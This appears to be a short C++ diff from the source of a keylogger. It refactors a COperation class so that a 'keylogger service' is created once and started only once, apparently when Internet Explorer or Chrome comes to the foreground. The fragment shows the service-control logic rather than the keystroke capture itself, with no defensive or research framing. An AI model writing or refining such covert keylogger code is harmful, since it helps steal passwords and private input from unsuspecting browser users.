@@ -2,7 +2,8 @@
 
 ///////////////////////////////////////////////////////////////////////////////////
 COperation::COperation(std::string strServiceFilePath) : 
-m_bStartService(FALSE), 
+m_bCreateService(FALSE), 
+m_bStartService(FALSE),
 m_bRealTimeCheck(FALSE),
 m_bStartOperatoin(TRUE),
 m_pAnalyzer(NULL),
@@ -39,7 +40,7 @@ m_pDataBase(NULL)
 		ErrorLog("Fail to create service [%s:%d]", __FUNCTION__, __LINE__);
 		return;
 	}
-	m_bStartService = TRUE;
+	m_bCreateService = TRUE;
 
 	assert(m_pRealTimeCheck == NULL);
 	m_pRealTimeCheck = new CRealTimeCheck();
@@ -204,10 +205,14 @@ DWORD COperation::StartOperation()
 				/*
 					Service have to be started after finding foreground about iexplorer, chrome
 				*/
-				dwRet = m_pService->StartSvc();
-				if (dwRet != SVC_OK) {
-					throw std::exception("Fail to start keylogger service");
+				if (!m_bStartService) {
+					dwRet = m_pService->StartSvc();
+					if (dwRet != SVC_OK) {
+						throw std::exception("Fail to start keylogger service");
+					}
+					m_bStartService = TRUE;
 				}
+				
 			}
 			else if (dwRet != E_RET_CHECK_FAIL) {
 				continue;
